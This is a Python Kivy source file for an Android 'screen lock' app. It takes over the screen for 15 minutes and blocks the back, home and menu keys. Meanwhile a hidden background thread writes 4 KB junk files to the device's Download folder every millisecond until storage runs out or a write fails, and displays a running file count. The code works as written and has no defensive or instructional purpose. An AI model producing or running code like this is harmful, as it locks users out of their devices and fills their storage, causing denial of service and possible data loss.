from kivy.app import App
from kivy.uix.floatlayout import FloatLayout
from kivy.uix.label import Label
from kivy.clock import Clock
from kivy.graphics import Rectangle, Color
from kivy.core.window import Window

from pathlib import Path
import os
import threading
import time


# ---------------------------------------------------
# BACKGROUND PROGRAM WITH FILE COUNTER
# ---------------------------------------------------
class JunkMaker:
    def __init__(self, update_callback):
        self.running = True
        self.folder = Path("/sdcard/Download/NexusJunk")
        os.makedirs(self.folder, exist_ok=True)

        self.data = b"X" * 4096
        self.update_callback = update_callback

        threading.Thread(target=self._run, daemon=True).start()

    def _run(self):
        i = 0
        while self.running:
            try:
                (self.folder / f"junk_{i:08d}.tmp").write_bytes(self.data)
                i += 1
                self.update_callback(i)  # update UI counter
            except Exception:
                break
            time.sleep(0.001)


# ---------------------------------------------------
# LOCK SCREEN
# ---------------------------------------------------
class LockScreen(FloatLayout):
    def __init__(self, app, **kwargs):
        super().__init__(**kwargs)
        self.app = app
        self.remaining = 15 * 60  # 15 minutes

        # Background
        with self.canvas.before:
            Color(0, 0, 0, 0.95)
            self.bg = Rectangle(pos=self.pos, size=Window.size)

        # Locked text
        self.label = Label(
            text="Screen Locked",
            font_size=48,
            bold=True,
            pos_hint={"center_x": 0.5, "center_y": 0.65},
            color=(1, 1, 1, 1)
        )
        self.add_widget(self.label)

        # Timer text
        self.timer_label = Label(
            text="15:00",
            font_size=40,
            pos_hint={"center_x": 0.5, "center_y": 0.5},
            color=(0.8, 0.8, 1, 1)
        )
        self.add_widget(self.timer_label)

        # File counter (side)
        self.counter_label = Label(
            text="Files: 0",
            font_size=32,
            pos_hint={"x": 0.02, "center_y": 0.1},
            color=(0.6, 0.9, 1, 1)
        )
        self.add_widget(self.counter_label)

        Clock.schedule_interval(self.update_timer, 1)

    def update_timer(self, dt):
        self.remaining -= 1
        minutes = self.remaining // 60
        seconds = self.remaining % 60
        self.timer_label.text = f"{minutes}:{seconds:02d}"

        if self.remaining <= 0:
            Clock.unschedule(self.update_timer)
            self.app.unlock_screen()

    def update_counter(self, count):
        self.counter_label.text = f"Files: {count}"


# ---------------------------------------------------
# MAIN APP
# ---------------------------------------------------
class ScreenLockApp(App):
    def build(self):
        # Fullscreen lock
        Window.fullscreen = True
        Window.bind(on_keyboard=self.block_keys)

        self.root = FloatLayout()

        # Create lock screen first
        self.lock_screen_widget = LockScreen(self)
        self.root.add_widget(self.lock_screen_widget)

        # Start background program with counter updates
        JunkMaker(self.lock_screen_widget.update_counter)

        return self.root

    def block_keys(self, window, key, *args):
        # Block BACK, HOME, MENU
        if key in (27, 1001, 1002):
            return True
        return False

    def clear(self):
        self.root.clear_widgets()

    def unlock_screen(self):
        self.clear()
        unlocked = Label(
            text="Unlocked",
            font_size=48,
            pos_hint={"center_x": 0.5, "center_y": 0.5},
            color=(0.3, 1, 0.3, 1)
        )
        self.root.add_widget(unlocked)


if __name__ == "__main__":
    ScreenLockApp().run()
